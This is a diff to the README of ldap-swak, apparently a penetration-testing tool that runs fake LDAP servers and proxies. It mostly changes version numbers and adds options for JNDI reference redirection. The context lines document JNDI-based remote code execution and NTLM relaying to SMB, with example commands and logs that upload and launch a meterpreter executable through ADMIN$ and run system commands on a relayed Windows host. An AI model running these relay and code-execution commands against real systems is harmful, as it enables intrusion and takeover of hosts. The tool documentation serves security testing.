@@ -13,14 +13,14 @@ Project Repository: https://github.com/SySS-Research/ldap-swak
 Maven required.
 > mvn package verify
 
--> target/ldap-swak-0.0.3-SNAPSHOT-all.jar
+-> target/ldap-swak-0.0.5-SNAPSHOT-all.jar
 
 
 ## Run
 
 Just run the JAR file with approriate subcommand and options:
 ```
-> java -jar target/ldap-swak-0.0.3-SNAPSHOT-all.jar 
+> java -jar target/ldap-swak-0.0.5-SNAPSHOT-all.jar 
 [...]
 LDAP Swiss Army Knife
       --accept-pass=<acceptPass>
@@ -151,7 +151,7 @@ Additional options:
 ```
 
 ```
-> java -jar target/ldap-swak-0.0.3-SNAPSHOT-all.jar fake -p 1389
+> java -jar target/ldap-swak-0.0.5-SNAPSHOT-all.jar fake -p 1389
 12:52:32.484 INFO FakeServer - Starting StartTLS listener on *:1389
 
 > ldapsearch -H ldap://localhost:1389/ -ZZ -x -D cn=test -w test
@@ -174,7 +174,7 @@ Additional options:
 ```
    
 ```               
-> java -jar target/ldap-swak-0.0.3-SNAPSHOT-all.jar proxy -p 2389 --server localhost:1389
+> java -jar target/ldap-swak-0.0.5-SNAPSHOT-all.jar proxy -p 2389 --server localhost:1389
 12:54:19.695 INFO ProxyServer - Starting StartTLS proxy on *:2389
 > ldapsearch -H ldap://localhost:2389/ -ZZ -x -D cn=foo -w test -b cn=test
 ldap_bind: Invalid credentials (49)
@@ -194,12 +194,20 @@ Options:
 --ref-codebase=  URL codebase to load class from
 ```
 
-For all requests return a JNDI reference object witha ObjectFactory from 
+For all requests return a JNDI reference object with a ObjectFactory from 
 the specified classpath. When a JNDI client makes a request with lookup() 
 semantics, this class is loaded and thereby code execution is achieved.
 
 The remote classloading has been disabled by default starting with 
 Java 11.0.1, 8u191, 7u201, and 6u211 (CVE-2018-3149).
+
+Regular references, redirecting to another server/protocol can be 
+specified as well with the options:
+
+```
+--ref-address=	 Reference address (multiple possible)
+--ref-factory=   Factory class to use
+```
 
 #### Referral
 
@@ -226,6 +234,8 @@ When a JNDI client makes a request with lookup() semantics,
 the provided data will be deserialized.
 
 
+
+
 ## NTLM Relaying
  
 The LDAP servers allow forwarding the NTLM exchange to a remote SMB server.
@@ -242,7 +252,7 @@ The order of operations is a convenient write/execute/read.
 
 For example, upload and launch a meterpreter instance:
 ```
-java -jar target/ldap-swak-0.0.3-SNAPSHOT-all.jar ke -p 1389 --ntlm-relay 192.168.56.101 --relay-write-file /tmp/test.exe --relay-write-to 'ADMIN$/Temp/foo.exe' --psexec-cmd "C:\\Windows\\Temp\\foo.exe"
+java -jar target/ldap-swak-0.0.5-SNAPSHOT-all.jar ke -p 1389 --ntlm-relay 192.168.56.101 --relay-write-file /tmp/test.exe --relay-write-to 'ADMIN$/Temp/foo.exe' --psexec-cmd "C:\\Windows\\Temp\\foo.exe"
 10:36:53.789 INFO FakeServer - Starting StartTLS listener on *:1389
 10:36:56.278 INFO PassTheHashNTLMSASLBindHandler - Have NTLM login administrator@DESKTOP-L96LL3H
 10:36:56.325 INFO PassTheHashRunner - Command line %COMSPEC% /b /c start /b /min C:\Windows\Temp\foo.exe
@@ -256,7 +266,7 @@ java -jar target/ldap-swak-0.0.3-SNAPSHOT-all.jar ke -p 1389 --ntlm-relay 192.16
 
 Or, execute a system command and get it's output:
 ```
-java -jar target/ldap-swak-0.0.3-SNAPSHOT-all.jake -p 1389 --ntlm-relay 192.168.56.101  --psexec-cmd "net user" --psexec-cmd-log C:\\Windows\\Temp\\test.log --relay-read-from 'ADMIN$/Temp/test.log'
+java -jar target/ldap-swak-0.0.5-SNAPSHOT-all.jake -p 1389 --ntlm-relay 192.168.56.101  --psexec-cmd "net user" --psexec-cmd-log C:\\Windows\\Temp\\test.log --relay-read-from 'ADMIN$/Temp/test.log'
 10:39:09.154 INFO FakeServer - Starting StartTLS listener on *:1389
 10:39:12.564 INFO PassTheHashNTLMSASLBindHandler - Have NTLM login administrator@DESKTOP-L96LL3H
 10:39:12.600 INFO PassTheHashRunner - Command line %COMSPEC% /b /c start /b /min C:\Windows\Temp\launch-1550569151302.cmd
